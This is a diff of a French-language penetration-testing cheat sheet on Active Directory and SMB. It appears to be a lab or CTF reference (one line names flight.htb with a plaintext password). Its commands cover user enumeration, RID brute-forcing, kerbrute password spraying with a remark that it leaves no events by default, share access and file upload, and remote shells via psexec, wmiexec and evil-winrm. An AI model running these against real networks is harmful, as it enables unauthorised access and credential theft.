@@ -5,11 +5,10 @@ public: true
 
 ## Récupération d'informations Active Directory et partages
 
-
-
 ## Politique de mot de passe
 
 ### SMB
+
 ```shell
 # crackmapexec
 cme smb $TARGET_IP -u "sql_svc" -p "qsdqsd" -d "domain"  --pass-pol | cut -c60-
@@ -45,6 +44,7 @@ cme smb $TARGET_IP -u "guest" -p "" --rid-brute 10000  # Max RID a adapter
 ## Utilisateurs connus (AD / Station)
 cme smb $TARGET_IP -u "$AD_USER" -p "$AD_PASSWORD" --users | tr -s ' ' | tail -n +4 | cut -d ' ' -f 5 | cut -d '\' -f 2 | tee users.txt
 ```
+
 ```shell
 ## Utilisateurs connectés sur la station
 cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --loggedon-users 
@@ -77,8 +77,9 @@ windapsearch.py --dc-ip $TARGET_IP -u $AD_USER@$AD_DOMAIN -p $AD_PASSWORD --PU
 
 #### Bruteforce
 
-On pourra utiliser la liste des noms d'utilisateurs les plus communs provenant de https://github.com/insidetrust/statistically-likely-usernames
-Par exemple le fichier : https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt
+On pourra utiliser la liste des noms d'utilisateurs les plus communs provenant de <https://github.com/insidetrust/statistically-likely-usernames>
+
+Par exemple le fichier : <https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt>
 
 ```shell
 # kerbrute
@@ -86,8 +87,8 @@ kerbrute userenum -d DOMAIN.LOCAL --dc $TARGET_IP userbiglist.Txt
 ```
 
 Cet utilitaire tente très rapidement tous les mots de passes de la liste.
-Il ne génère par d'évènement dans un AD configuré avec les options par défaut.
 
+Il ne génère par d'évènement dans un AD configuré avec les options par défaut.
 
 #### Attaques
 
@@ -96,6 +97,7 @@ Lorsqu'on dispose d'une liste de comptes utilisateurs, on peut ensuite essayer d
 ##### Password Spraying
 
 **Attention** :
+
 - toujours vérifier la politique de mot de passe en place (voir plus haut) avant de tenter un password spraying.
 - ne pas tenter le nombre maximum de tentatives autorisées !
 - `cme [...] --users`  affiche le nombre de mauvaise saisie des compteurs d'authentification (a exécuter sur le PDC emulator pour avoir l'information centralisée de tous les DCs)
@@ -112,7 +114,6 @@ for u in $(cat users.txt);do rpcclient -U "$u%$AD_PASSWORD" -c "getusername;quit
 # kerbrute
 kerbrute passwordspray -d $AD_DOMAIN --dc $TARGET_IP users.txt  "$AD_PASSWORD"
 ```
-
 
 ## Groupes
 
@@ -157,10 +158,10 @@ enum4linux -a -u "guest" -p "" $TARGET_IP
 smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP
 ```
 
-
-### Accès à un partage 
+### Accès à un partage
 
 #### smbclient.py
+
 ```shell
 smbclient.py -no-pass $TARGET_IP  # null bind
 smbclient.py "$AD_DOMAIN/$AD_USER:$AD_PASSWORD@$TARGET_IP"    
@@ -173,13 +174,16 @@ Password:       <==== Appuyer sur Entrer
 ```
 
 #### smbclient
+
 ```
 smbclient -U guest%'' //$TARGET_IP/WorkShares 
 
 # null authentication
 smbclient -N -L //$TARGET_IP   # liste les partages
 ```
+
 #### smbmap
+
 ```shell
 # Liste des partages 
 smbmap -u "" -p "" -H $TARGET_IP   
@@ -195,10 +199,10 @@ $ smbmap -u "" -p "" -H $TARGET_IP --download  "sambashare\contents\flag.txt"
 smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP --upload desktop.ini Share/desktop.ini
 ```
 
-
-### Explorer les partages 
+### Explorer les partages
 
 #### crackmapexec
+
 ```bash
 rm -rf /tmp/cme_spider_plus # dossier contenant les résultats du module spider_plus
 
@@ -216,6 +220,7 @@ cat /tmp/cme_spider_plus/*.json | jq '. | to_entries | .[] | {share: .key, file:
 ```shell
 smbmap -u $AD_USER -p $AD_PASSWORD -d $AD_DOMAIN -H $TARGET_IP -R "$SHARE/" --dir-only
 ```
+
 ## Shell
 
 ### WinRM
@@ -232,6 +237,7 @@ evil-winrm -i $TARGET_IP -u "$AD_USER" -p "$AD_PASSWORD"
 ### RPC + SMB
 
 Exécute un shell distant en tant que SYSTEM
+
 ```shell
 # Nécessite l'accès au partage Admin$ + RPC pour la communication
 psexec.py $AD_DOMAIN/$AD_USER:"$AD_PASSWORD"@$TARGET_IP
@@ -242,7 +248,9 @@ smbexec.py $AD_DOMAIN/$AD_USER:"$AD_PASSWORD"@$TARGET_IP
 ### WMI
 
 Exécute un shell semi interactif (spawn un cmd.exe a chaque exécution de commande).
+
 Fourni un accès avec le compte utilisateur utilisé ($AD_USER)
+
 ```shell
 wmiexec.py $AD_DOMAIN/$AD_USER:"$AD_PASSWORD"@$TARGET_IP
 ```
@@ -250,13 +258,15 @@ wmiexec.py $AD_DOMAIN/$AD_USER:"$AD_PASSWORD"@$TARGET_IP
 ### DECRPC
 
 SCShell
-https://github.com/Mr-Un1k0d3r/SCShell
+
+<https://github.com/Mr-Un1k0d3r/SCShell>
 
 ## Bloodhound
 
 Bloodhound python injector available as a docker image (python2)
-sudo docker run --rm -v ${PWD}:/bloodhound-data -it bloodhound 
+
+sudo docker run --rm -v ${PWD}:/bloodhound-data -it bloodhound
+
 $ bloodhound-python  -u 'svc_apache' -p 'S@Ss!K@*t13' -c All -d 'flight.htb' -v -ns 10.10.11.187
+
 ```
-
-
